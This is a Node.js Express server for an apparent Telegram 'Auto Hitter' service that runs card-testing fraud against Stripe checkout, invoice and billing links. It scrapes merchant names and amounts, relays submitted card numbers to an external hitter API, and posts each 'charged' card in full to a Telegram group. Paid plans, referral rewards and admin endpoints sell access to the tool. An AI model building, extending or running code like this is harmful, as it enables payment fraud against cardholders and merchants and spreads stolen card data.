const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

const axios = require('axios');
const config = require('./config');
const storage = require('./storage');
const membership = require('./membership'); // New robust check
const bot = require('./bot');

// Serve static files from the current directory
const fs = require('fs');

// Serve static files from the current directory
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' })); // Increase limit for mass cards

// --- DATABASE LOGIC ---
// To persist on Render, mount a disk at /data and move database.json there
const DATA_DIR = fs.existsSync('/data') ? '/data' : __dirname;
const DB_FILE = path.join(DATA_DIR, 'database.json');

function readDB() {
  return storage.getDB();
}

async function writeDB(data) {
  return await storage.save(data);
}

// Daily Limit Reset Logic
function checkDailyReset(user) {
  const today = new Date().toDateString();
  if (user.last_hit_date !== today) {
    user.hits_today = 0;
    user.last_hit_date = today;
    return true;
  }
  return false;
}

// --- DATABASE & OTP LOGIC ---
const otpStore = new Map(); // chatId -> { otp, expires }

function checkPlanExpiry(user, db) {
  if (user.plan !== 'free' && user.expiry) {
    if (new Date() > new Date(user.expiry)) {
      console.log(`[Expiry] Plan expired for user. Resetting to FREE.`);
      user.plan = 'free';
      user.expiry = null;
      if (db) storage.save(db); // Async fire-and-forget for background expiry
      return true;
    }
  }
  return false;
}

// Advanced Stripe Scraper (Maximum Reliability)
async function scrapeStripeInfo(url) {
    try {
        const response = await axios.get(url, {
            headers: { 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9'
            },
            timeout: 12000
        });
        const html = response.data;

        let site = 'Stripe Checkout';
        let amount = 'Unknown';

        // 1. TRY META TAGS (Most Reliable for Previews)
        const ogTitle = html.match(/<meta[^>]*property="og:title"[^>]*content="([^"]+)"/i) ||
                        html.match(/<meta[^>]*name="twitter:title"[^>]*content="([^"]+)"/i);
        const ogDesc = html.match(/<meta[^>]*property="og:description"[^>]*content="([^"]+)"/i) ||
                       html.match(/<meta[^>]*name="description"[^>]*content="([^"]+)"/i);

        if (ogTitle) {
            site = ogTitle[1].replace(/Pay /i, '').replace(/ | Stripe/i, '').trim();
        }

        if (ogDesc) {
            // Description often looks like "Pay $10.00 to Merchant Name"
            const amtMatch = ogDesc[1].match(/([$€£¥৳]\s?\d+([.,]\d{2})?)/) || 
                             ogDesc[1].match(/(\d+([.,]\d{2})?\s?(?:USD|EUR|GBP|BDT|CAD|AUD))/i);
            if (amtMatch) amount = amtMatch[1].trim();
        }

        // 2. TRY JSON-IN-HTML (window.__INITIAL_STATE__)
        if (amount === 'Unknown' || site === 'Stripe Checkout') {
            const jsonMatch = html.match(/window\.__INITIAL_STATE__\s*=\s*({.+?});/s);
            if (jsonMatch) {
                try {
                    const state = JSON.parse(jsonMatch[1]);
                    // Traverse through common Stripe state paths
                    const context = state.checkout || state.payment_intent || state.invoice || {};
                    if (context.business_name) site = context.business_name;
                    if (context.total_amount_display) amount = context.total_amount_display;
                    else if (context.amount_formatted) amount = context.amount_formatted;
                } catch (e) {}
            }
        }

        // 3. BROAD REGEX FALLBACK (Look for currency signs in body)
        if (amount === 'Unknown') {
            // Matches: $10.00, €5,00, £12.50, BDT 500, etc.
            const currencyRegex = /([$€£¥৳]\s?\d{1,3}(?:[.,]\d{3})*(?:[.,]\d{2})?)/g;
            const matches = html.match(currencyRegex);
            if (matches && matches.length > 0) {
                // Often the largest or first currency value is the total
                amount = matches[0]; 
            }
        }

        // Final cleanup for site name
        if (site.toLowerCase().includes('stripe')) site = site.replace(/\| Stripe/gi, '').trim();
        if (site === 'Title' || !site) site = 'Stripe Page';

        return { site, amount };
    } catch (err) {
        console.error('[Scraper Error]:', err.message);
        return { site: 'Stripe Page', amount: 'Unknown' };
    }
}

// Link Analysis Endpoint (Primary: User's API | Fallback: Native Scraper)
app.post('/analyze-link', async (req, res) => {
    let { url } = req.body;
    if (!url) return res.status(400).json({ error: 'URL required' });

    url = url.trim();
    
    // Support custom domains like billing.gamma.app
    const isStripePath = url.includes('stripe.com') || 
                        url.includes('/c/pay/') || 
                        url.includes('/billing/') || 
                        url.includes('/invoice/') || 
                        url.includes('/p/session/');

    if (!isStripePath) {
        return res.status(400).json({ error: 'Invalid Stripe or Billing URL' });
    }

    const db = readDB();
    const settings = db.settings || {};
    const EXTRACT_API = settings.extract_api || config.EXTRACT_API;
    console.log(`[Link Analysis] Processing: ${url}`);

    try {
        // 1. ATTEMPT EXTERNAL API (User's Primary Choice)
        console.log(`[Link Analysis] Trying External API...`);
        const apiResponse = await axios.post(EXTRACT_API, { url }, { 
            headers: { 
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': 'true' 
            },
            timeout: 15000 
        }).catch(err => {
            console.warn(`[Link Analysis] External API Failed: ${err.message}`);
            return null; // Handle failure gracefully
        });

        if (apiResponse && apiResponse.data) {
            const data = apiResponse.data;
            console.log(`[Link Analysis] Success from API:`, JSON.stringify(data));
            
            let site = data.name || data.merchant || 'Stripe Checkout';
            let amount = data.price || data.amount || 'Unknown';
            
            // Clean up
            if (site.includes('Pay ')) site = site.replace('Pay ', '');
            if (site.includes(' | Stripe')) site = site.split(' | Stripe')[0];
            
            // Cleanup escaped characters like \n or \\n
            site = site.replace(/\\n/g, ' ').replace(/\n/g, ' ').replace(/\\/g, '').trim();
            
            return res.json({ site, amount });
        }

        // 2. FALLBACK TO NATIVE SCRAPER (If API is offline/failed)
        console.log(`[Link Analysis] Falling back to Native Scraper...`);
        const result = await scrapeStripeInfo(url);
        res.json(result);

    } catch (err) {
        console.error('[Link Analysis Error]:', err.message);
        res.status(500).json({ 
            error: 'Analysis Error', 
            details: err.message,
            site: 'Stripe Page',
            amount: 'Unknown' 
        });
    }
});


// --- USER & HIT MANAGEMENT ---

// Get User Plan Info & Handle Referrals
app.post('/get-user-info', (req, res) => {
  const { chatId, referrerId } = req.body;
  if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

  const db = readDB();
  let user = db.users[chatId];
  let isNewUser = false;

  if (!user) {
    isNewUser = true;
    user = {
      plan: 'free',
      hits_today: 0,
      last_hit_date: new Date().toDateString(),
      expiry: null,
      referralCount: 0,
      referredBy: null,
      isVerified: false,
      total_hits: 0
    };
    db.users[chatId] = user;
    console.log(`[Referral] New user registered: ${chatId}`);
  }

  // Handle Referral Logic for New Users (Wait for verification to credit)
  if (isNewUser && referrerId && referrerId !== chatId) {
    const referrer = db.users[referrerId];
    if (referrer) {
      user.referredBy = referrerId;
      console.log(`[Referral] User ${chatId} referred by ${referrerId}. Awaiting verification.`);
    }
  }

  checkDailyReset(user);
  checkPlanExpiry(user, db);
  storage.save(db); // Sync back any changes

  const allUsers = Object.entries(db.users)
    .map(([id, u]) => ({ id, total_hits: u.total_hits || 0 }))
    .sort((a, b) => b.total_hits - a.total_hits);

  const totalUsers = allUsers.length;
  const totalHitsGlobal = allUsers.reduce((sum, u) => sum + u.total_hits, 0);
  const userTotalHits = user.total_hits || 0;
  const userRank = allUsers.findIndex(u => u.id === chatId) + 1;

  // Current mandatory channels/groups list
  const settings = db.settings || {};
  const CHANNELS = settings.channels || config.CHANNELS;
  const formattedChannels = CHANNELS.map(ch => {
      let url = ch;
      let name = ch;
      if (typeof ch === 'string') {
          if (ch.startsWith('@')) {
              url = `https://t.me/${ch.substring(1)}`;
              name = ch.substring(1).split('_').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
          } else if (ch.startsWith('-')) {
              url = `tg://resolve?domain=${ch}`; // Fallback for IDs
              name = `Private Group (${ch})`;
          }
      }
      return { id: ch, name, url };
  });

  res.json({
    chatId,
    plan: user.plan,
    hitsToday: user.hits_today,
    maxHits: user.plan === 'free' ? 2 : 'Unlimited',
    expiry: user.expiry,
    referralCount: user.referralCount || 0,
    isVerified: user.isVerified || false,
    totalUsers,
    totalHitsGlobal,
    userTotalHits,
    userRank,
    channels: formattedChannels
  });
});

// Send OTP via Bot
app.post('/send-otp', async (req, res) => {
    const { chatId } = req.body;
    if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    otpStore.set(chatId, { otp, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry

    const message = `🔐 <b>Verification Code</b>\n\nYour OTP for <b>Auto Hitter App</b> is: <code>${otp}</code>\n\nDon't share this code with anyone.`;
    
    try {
        const bot = require('./bot'); // Ensure bot is available
        await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
        console.log(`[OTP] Sent to ${chatId}`);
        res.json({ success: true });
    } catch (err) {
        console.error('[OTP] Failed to send:', err.message);
        res.status(500).json({ error: 'Failed to send OTP. Make sure you started the bot!' });
    }
});

// Verify OTP
app.post('/verify-otp', (req, res) => {
    const { chatId, code, referrerId } = req.body;
    const stored = otpStore.get(chatId);

    if (!stored || stored.otp !== code || Date.now() > stored.expires) {
        return res.status(400).json({ error: 'Invalid or expired code' });
    }

    otpStore.delete(chatId); // Clear after use
    res.json({ success: true });
});

// Endpoint to verify channel membership
app.post('/verify-membership', async (req, res) => {
    const { chatId } = req.body;
    if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

    const db = readDB();
    const user = db.users[chatId];
    if (!user) return res.status(404).json({ error: 'User not found' });

    // Channels from DB or Config
    const settings = db.settings || {};
    const bot = require('./bot');
    
    try {
        const allJoined = await membership.checkMembership(bot, chatId, true);
        
        if (allJoined) {
            const wasVerified = user.isVerified;
            user.isVerified = true;
            
            // Crediting the Referrer ONLY ONCE
            if (!wasVerified && user.referredBy) {
                const referrer = db.users[user.referredBy];
                if (referrer) {
                    referrer.referralCount = (referrer.referralCount || 0) + 1;
                    console.log(`[Referral] Verification Success: Credited ${user.referredBy}. New Count: ${referrer.referralCount}`);
                    
                    // Reward Check: 10 Referrals = Silver Plan for 7 days
                    if (referrer.referralCount >= 10) {
                        const expiry = new Date();
                        expiry.setDate(expiry.getDate() + 7);
                        referrer.plan = 'silver';
                        referrer.expiry = expiry.toISOString();
                        referrer.referralCount -= 10;
                        notifyPlanActivation(user.referredBy, 'silver', '7 day(s)');
                    }
                }
            }
            
            await storage.save(db);
            res.json({ success: true, message: 'Verification successful!' });
        } else {
            const cached = membership.membershipCache?.get(chatId.toString());
            let errorMsg = 'You have not joined all channels yet.';
            if (cached && cached.failingChannel) {
                const debugStatus = cached.status_detail ? ` (Status: ${cached.status_detail})` : '';
                errorMsg = `Please join the channel: ${cached.failingChannel}${debugStatus}`;
            }
            res.status(400).json({ error: errorMsg });
        }
    } catch (err) {
        console.error('[Verify] Membership check system error:', err.message);
        res.status(500).json({ error: 'Verification system error. Try again later.' });
    }
});

// Hit Proxy with Limit Checks
// Telegram Notification Helper (Server-side)
// Helper to escape HTML special characters for Telegram
function escapeHTML(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

async function sendHitNotification(res, gate, userPlan, userName, site, amount, card) {
    const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
    const CHAT_ID = config.NOTIFY_CHAT_ID;

    const gatewayMap = {
        'checkout': 'Stripe Checkout Hitter',
        'invoice': 'Stripe Invoice Hitter',
        'billing': 'Stripe Billing Hitter'
    };
    const gateway = gatewayMap[gate] || 'Stripe Hitter';

    const message = `
🔥 <b>HIT DETECTED</b> ⚡
👤 <b>User</b>: <code>${escapeHTML(userName) || 'User'}</code>
👤 <b>Plan</b>: ${escapeHTML(userPlan.toUpperCase())}
💳 <b>Card</b>: <code>${escapeHTML(card) || 'Unknown'}</code>
↔️ <b>Gateway</b>: ${escapeHTML(gateway)}
✅ <b>Response</b>: Charged Successfully
🌐 <b>Site</b>: ${escapeHTML(site) || 'Stripe Checkout'}
💰 <b>Amount</b>: ${escapeHTML(amount) || 'Unknown'}
`.trim();

    try {
        console.log(`[Notification] Sending hit to ${CHAT_ID}...`);
        const response = await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });
        console.log(`[Notification] SUCCESS sent to ${CHAT_ID}`);
    } catch (err) {
        // Fallback: If HTML fails (due to tags/characters), try sending as Plain Text
        try {
            console.warn(`[Notification] HTML failed, trying Plain Text...`);
            const plainMsg = message.replace(/<[^>]*>/g, ''); // Remove HTML tags
            await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `🔥 HIT DETECTED 🔥\n\n${plainMsg}`
            });
            console.log(`[Notification] SUCCESS sent (Plain Text) to ${CHAT_ID}`);
        } catch (e) {
            console.error(`[Notification] CRITICAL: Both HTML and Plain Text failed for ${CHAT_ID}`);
            if (err.response) console.error('[Telegram Details]:', err.response.data);
        }
    }
}

// Function to send plan activation notification (Group and Personal)
async function notifyPlanActivation(chatId, plan, duration) {
    const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
    const NOTIFY_CHAT_ID = config.NOTIFY_CHAT_ID;

    const message = `
⭐ <b>Plan Activated</b>
━━━━━━━━━━━━━━━━━━━━

👤 <b>User</b>: <code>${chatId}</code>
📦 <b>Plan</b>: ${plan.toUpperCase()}
📅 <b>Duration</b>: ${duration || '7 day(s)'}

<i>User ${duration ? 'was upgraded' : 'bought'} ${plan.toUpperCase()} plan ✅</i>

━━━━━━━━━━━━━━━━━━━━
`.trim();

    try {
        // Send to Group
        await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
            chat_id: NOTIFY_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        }).catch(() => {});

        // Send to User
        const bot = require('./bot');
        await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' }).catch(() => {});
    } catch (err) {
        console.error('[Notification] Activation failed:', err.message);
    }
}

// Hit Proxy with Limit Checks
app.post('/hit-proxy/:gate', async (req, res) => {
    const { gate } = req.params;
    const { chatId, card, url, userName, site, amount } = req.body;

    if (!chatId || !card || !url) {
        return res.status(400).json({ error: 'Missing parameters (chatId, card, or url)' });
    }

    const db = readDB();
    const user = db.users[chatId];

    if (!user) {
        return res.status(403).json({ error: 'User not registered. Please login.' });
    }

    checkDailyReset(user);
    if (user.plan !== 'free') checkPlanExpiry(user, db);

    // Enforce Limit for Free Plan
    if (user.plan === 'free' && user.hits_today >= 2) {
        return res.status(403).json({
            error: 'Limit Reached',
            message: 'You have reached your daily limit of 2 hits. Upgrade to Silver/Gold for unlimited access!'
        });
    }

    try {
        const settings = db.settings || {};
        const API_KEY = settings.api_key || config.API_KEY;
        const API_URL = settings.api_url || config.API_URL;

        // Use validateStatus: () => true to prevent axios from throwing on 4xx/5xx responses
        // from the hitter backend. This allows us to parse the status properly.
        const response = await axios.post(`${API_URL}/hit/${gate}`, {
            url,
            card
        }, {
            headers: { 'X-API-Key': API_KEY, 'Content-Type': 'application/json' },
            timeout: 120000,
            validateStatus: () => true 
        });

        let result = response.data;
        
        // Handle cases where result is a string, null, or not an object
        if (!result || typeof result !== 'object') {
            const errorMsg = typeof result === 'string' ? result : 'Empty or non-JSON response';
            result = { 
                status: 'error', 
                message: `Server Error (${response.status}): ${errorMsg}`,
                raw: result 
            };
        }
        
        // Ensure status and message exist for the frontend logic
        if (!result.status) result.status = response.status >= 400 ? 'error' : 'unknown';
        if (!result.message && !result.error) {
            result.message = `Response Code: ${response.status}`;
        }

        const status = (result.status || '').toLowerCase();
        const lowerMsg = (result.message || result.error || '').toLowerCase();

        // ONLY deduct from limit if strictly 'charged' or 'approved' or if session is already succeeded
        if (status === 'charged' || status === 'approved' || lowerMsg.includes('checkout_succeeded_session')) {
            // ONLY increment hits for FREE users. Premium users stay at 0.
                if (user.plan === 'free') {
                    user.hits_today++;
                }
                // Global Total Hits
                user.total_hits = (user.total_hits || 0) + 1;
                
                await storage.save(db);
                console.log(`[Limit] SUCCESS for ${chatId} (${user.plan}). Total hits: ${user.total_hits}`);
                await sendHitNotification(result, gate, user.plan, userName, site, amount, card);
        } else {
            console.log(`[Limit] FAILED/DECLINED for ${chatId} (${status}). Limit NOT deducted.`);
        }

        // ALWAYS return current remaining hits even if the hit failed
        res.json({
            ...result,
            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
        });

    } catch (err) {
        console.error('Proxy System Error:', err.message);
        // Even on internal proxy error, try to return current hits
        res.status(500).json({ 
            error: 'System Error', 
            message: err.message,
            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
        });
    }
});

// Redeem Code Endpoint
app.post('/redeem-code', async (req, res) => {
  const { chatId, code } = req.body;
  if (!chatId || !code) return res.status(400).json({ error: 'Chat ID and Code required' });

  const db = readDB();
  const userData = db.users[chatId];
  const codeData = db.redeem_codes[code];

  if (!codeData || codeData.status !== 'active') {
    return res.status(400).json({ error: 'Invalid or Used Code' });
  }

  if (!userData) {
    return res.status(404).json({ error: 'User not found. Please login first.' });
  }

  // Handle Promo Code Logic
  let durationMsg = '7 day(s)';
  const expiryDate = new Date();

  if (codeData.type === 'promo') {
    // Check if user already used this promo code
    if (codeData.redeemedBy && codeData.redeemedBy.includes(chatId)) {
      return res.status(400).json({ error: 'You have already redeemed this promo code!' });
    }

    // Check usage limit
    if (codeData.usedCount >= codeData.maxUses) {
      codeData.status = 'exhausted';
      await writeDB(db);
      return res.status(400).json({ error: 'Promo code usage limit reached!' });
    }

    // Set duration in hours
    const hours = parseInt(codeData.durationHours) || 1;
    expiryDate.setHours(expiryDate.getHours() + hours);
    durationMsg = `${hours} hour(s)`;

    // Update usage
    codeData.usedCount = (codeData.usedCount || 0) + 1;
    if (!codeData.redeemedBy) codeData.redeemedBy = [];
    codeData.redeemedBy.push(chatId);

    if (codeData.usedCount >= codeData.maxUses) {
      codeData.status = 'exhausted';
    }
  } else {
    // Standard 7-day Code
    expiryDate.setDate(expiryDate.getDate() + 7);
    codeData.status = 'used';
    codeData.usedBy = chatId;
  }

  userData.plan = codeData.plan;
  userData.expiry = expiryDate.toISOString();

  await writeDB(db);

  // Notify after successful redemption
  notifyPlanActivation(chatId, userData.plan, durationMsg);

  res.json({ 
    success: true, 
    plan: userData.plan, 
    expiry: userData.expiry,
    message: `Congratulations! Your ${userData.plan.toUpperCase()} plan is now active for ${durationMsg}!`
  });
});

// --- ADMIN ENDPOINTS ---
const ADMIN_PWD = config.ADMIN_PWD;

app.post('/admin/generate-code', async (req, res) => {
  const { password, plan } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });

  const code = 'HIT-' + Math.random().toString(36).substring(2, 10).toUpperCase();
  const db = readDB();
  db.redeem_codes[code] = { 
    type: 'standard',
    plan, 
    status: 'active', 
    createdAt: new Date().toISOString() 
  };
  await storage.save(db);

  res.json({ code, plan });
});

// Generate Promo Code Endpoint
app.post('/admin/generate-promo', async (req, res) => {
  try {
    const { password, plan, maxUses, durationHours } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });

    const code = 'PROMO-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const db = readDB();
    
    if (!db.redeem_codes) db.redeem_codes = {};

    db.redeem_codes[code] = { 
      type: 'promo',
      plan: plan || 'silver', 
      maxUses: parseInt(maxUses) || 1,
      durationHours: parseInt(durationHours) || 1,
      usedCount: 0,
      redeemedBy: [],
      status: 'active', 
      createdAt: new Date().toISOString() 
    };
    
    await storage.save(db);
    res.json({ code, plan, maxUses, durationHours });
  } catch (err) {
    console.error('[Admin] Generate Promo Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// Broadcast Message to All Users
app.post('/admin/broadcast', async (req, res) => {
  try {
    const { password, message } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    if (!message) return res.status(400).json({ error: 'Message required' });

    const db = readDB();
    const userIds = Object.keys(db.users || {});
    
    if (userIds.length === 0) {
      return res.json({ success: true, count: 0, failed: 0, message: 'No users to broadcast to.' });
    }

    console.log(`[Admin] Starting broadcast to ${userIds.length} users...`);
    const bot = require('./bot');
    
    let successCount = 0;
    let failedCount = 0;

    // We use a loop instead of Promise.all to avoid hitting Telegram's rate limits
    // and to handle individual errors more gracefully.
    for (const uid of userIds) {
      try {
        await bot.telegram.sendMessage(uid, message, { parse_mode: 'HTML' });
        successCount++;
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 50)); 
      } catch (err) {
        console.warn(`[Admin] Broadcast failed for user ${uid}:`, err.message);
        failedCount++;
      }
    }

    console.log(`[Admin] Broadcast completed: ${successCount} success, ${failedCount} failed.`);
    res.json({ 
      success: true, 
      count: successCount, 
      failed: failedCount, 
      message: `Broadcast completed. Sent: ${successCount}, Failed: ${failedCount}` 
    });
  } catch (err) {
    console.error('[Admin] Broadcast Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

app.post('/admin/users', (req, res) => {
  try {
    const { password } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    const db = readDB();
    if (!db || !db.users) return res.json({});
    res.json(db.users);
  } catch (err) {
    console.error('[Admin] Get Users Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// System Settings Endpoints
app.post('/admin/get-settings', async (req, res) => {
  try {
    const { password } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    const db = readDB();
    const settings = db.settings || { 
        api_key: config.API_KEY, 
        api_url: config.API_URL,
        extract_api: config.EXTRACT_API,
        channels: config.CHANNELS
    };
    if (!settings.extract_api) settings.extract_api = config.EXTRACT_API;
    if (!settings.channels) settings.channels = config.CHANNELS;
    res.json(settings);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/admin/update-settings', async (req, res) => {
  try {
    const { password, api_key, api_url, extract_api, channels } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    
    const db = readDB();
    const oldSettings = db.settings || {};
    db.settings = { 
        ...oldSettings,
        api_key: (api_key || '').trim(), 
        api_url: (api_url || '').trim(),
        extract_api: (extract_api || '').trim(),
        channels: Array.isArray(channels) ? channels : (oldSettings.channels || config.CHANNELS)
    };
    
    await storage.save(db);
    res.json({ success: true, message: 'Settings updated successfully' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DIRECT Activation by Chat ID
app.post('/admin/update-user', async (req, res) => {
  try {
    const { password, targetChatId, plan, duration } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    if (!targetChatId || !plan) return res.status(400).json({ error: 'Chat ID and Plan required' });

    const db = readDB();
    let user = db.users[targetChatId];

    if (!user) {
      user = {
        plan: 'free',
        hits_today: 0,
        last_hit_date: new Date().toDateString(),
        expiry: null,
        referralCount: 0,
        referredBy: null
      };
      db.users[targetChatId] = user;
    }

    user.plan = plan;
    
    if (plan === 'free') {
      user.expiry = null;
    } else {
      if (duration === '7days') {
        const expiry = new Date();
        expiry.setDate(expiry.getDate() + 7);
        user.expiry = expiry.toISOString();
      } else if (duration === 'permanent') {
        user.expiry = null; // No expiry
      }
    }

    await storage.save(db);
    // Notify after successful activation
    notifyPlanActivation(targetChatId, plan, duration === '7days' ? '7 day(s)' : 'Permanent');

    res.json({ success: true, message: `User ${targetChatId} updated to ${plan.toUpperCase()} (${duration})` });
  } catch (err) {
    console.error('[Admin] Update User Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// Update Referrals Endpoint
app.post('/admin/update-referrals', async (req, res) => {
  try {
    const { password, targetChatId, newCount } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    if (!targetChatId) return res.status(400).json({ error: 'Chat ID required' });

    const db = readDB();
    let user = db.users[targetChatId];

    if (!user) {
      user = {
        plan: 'free',
        hits_today: 0,
        last_hit_date: new Date().toDateString(),
        expiry: null,
        referralCount: 0,
        referredBy: null
      };
      db.users[targetChatId] = user;
    }

    user.referralCount = parseInt(newCount) || 0;

    // Auto Reward if count >= 10
    if (user.referralCount >= 10 && user.plan === 'free') {
        const expiry = new Date();
        expiry.setDate(expiry.getDate() + 7);
        user.plan = 'silver';
        user.expiry = expiry.toISOString();
        user.referralCount -= 10;
        notifyPlanActivation(targetChatId, 'silver', '7 day(s)');
    }

    await storage.save(db);
    res.json({ success: true, message: `User ${targetChatId} referrals updated to ${user.referralCount}` });
  } catch (err) {
    console.error('[Admin] Update Referrals Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.send('PONG');
});

// Send index.html for all routes to handle TWA correctly
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Self-ping to prevent Render sleeping
function startKeepAlive() {
  const url = process.env.RENDER_EXTERNAL_URL;
  if (url) {
    console.log(`Keep-alive started for: ${url}`);
    setInterval(() => {
      https.get(`${url}/ping`, (res) => {
        console.log(`Self-ping status: ${res.statusCode}`);
      }).on('error', (err) => {
        console.error(`Self-ping failed: ${err.message}`);
      });
    }, 14 * 60 * 1000); // 14 minutes (Render sleeps after 15)
  }
}

async function startServer() {
  // Sync DB on Startup
  await storage.init();
  
  app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Open http://localhost:${PORT} to view your app`);
    startKeepAlive();
    
    // Launch Bot
    bot.launch()
      .then(() => {
        console.log('✅ Telegram Bot is active!');
      })
      .catch(err => {
        console.error('❌ Telegram Bot Error:', err.message);
        console.log('⚠️ Server will continue running without the bot.');
      });
  
    // Enable graceful stop
    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
  });
}

startServer();
